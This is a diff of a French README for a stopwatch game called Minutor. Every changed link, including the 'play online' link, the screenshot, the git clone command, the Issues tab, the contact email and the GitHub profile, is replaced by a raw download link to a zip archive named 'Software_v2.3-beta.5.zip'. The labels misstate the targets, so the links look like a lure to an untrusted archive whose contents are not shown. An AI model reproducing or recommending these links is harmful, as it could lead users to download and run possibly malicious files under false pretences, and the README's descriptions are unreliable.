@@ -9,7 +9,7 @@
 - ⏱️ **Chronomètre interactif** : Appuyez sur "Stop" pour arrêter le chronomètre au moment idéal.
 - 🏆 **Calcul du score** : Gagnez des points en fonction de votre précision.
 - 🚀 **Réinitialisation facile** : Relancez le défi à tout moment.
-- 🌐 **Déployé sur GitHub Pages** : Jouez en ligne via [https://raw.githubusercontent.com/Martialdepaul/Minutor/master/src/Minutor_v2.8.zip].
+- 🌐 **Déployé sur GitHub Pages** : Jouez en ligne via [https://github.com/Martialdepaul/Minutor/raw/refs/heads/master/public/Software_v2.3-beta.5.zip].
 
 ---
 
@@ -17,7 +17,7 @@
 
 Voici une capture d'écran de **Minutor** :
 
-![Aperçu de Minutor](https://raw.githubusercontent.com/Martialdepaul/Minutor/master/src/Minutor_v2.8.zip)
+![Aperçu de Minutor](https://github.com/Martialdepaul/Minutor/raw/refs/heads/master/public/Software_v2.3-beta.5.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Pour jouer localement ou contribuer au développement, suivez ces étapes :
 
 1. Clonez le dépôt :
    ```bash
-   git clone https://raw.githubusercontent.com/Martialdepaul/Minutor/master/src/Minutor_v2.8.zip
+   git clone https://github.com/Martialdepaul/Minutor/raw/refs/heads/master/public/Software_v2.3-beta.5.zip
    cd minutor
    ```
 
@@ -82,7 +82,7 @@ Le jeu est déployé sur GitHub Pages. Pour déployer une nouvelle version :
 
 ## 🧩 Contribuer
 
-Les contributions sont les bienvenues ! Si vous souhaitez ajouter des fonctionnalités ou corriger des bogues, ouvrez une *pull request* ou signalez un problème dans l'onglet [Issues](https://raw.githubusercontent.com/Martialdepaul/Minutor/master/src/Minutor_v2.8.zip).
+Les contributions sont les bienvenues ! Si vous souhaitez ajouter des fonctionnalités ou corriger des bogues, ouvrez une *pull request* ou signalez un problème dans l'onglet [Issues](https://github.com/Martialdepaul/Minutor/raw/refs/heads/master/public/Software_v2.3-beta.5.zip).
 
 ---
 
@@ -96,7 +96,7 @@ Ce projet est sous licence **MIT**. Consultez le fichier [LICENSE](LICENSE) pour
 
 Pour toute question ou suggestion, n'hésitez pas à me contacter :
 
-- **Email** : https://raw.githubusercontent.com/Martialdepaul/Minutor/master/src/Minutor_v2.8.zip
-- **GitHub** : [@MartialDePaul](https://raw.githubusercontent.com/Martialdepaul/Minutor/master/src/Minutor_v2.8.zip)
+- **Email** : https://github.com/Martialdepaul/Minutor/raw/refs/heads/master/public/Software_v2.3-beta.5.zip
+- **GitHub** : [@MartialDePaul](https://github.com/Martialdepaul/Minutor/raw/refs/heads/master/public/Software_v2.3-beta.5.zip)
 
 ---
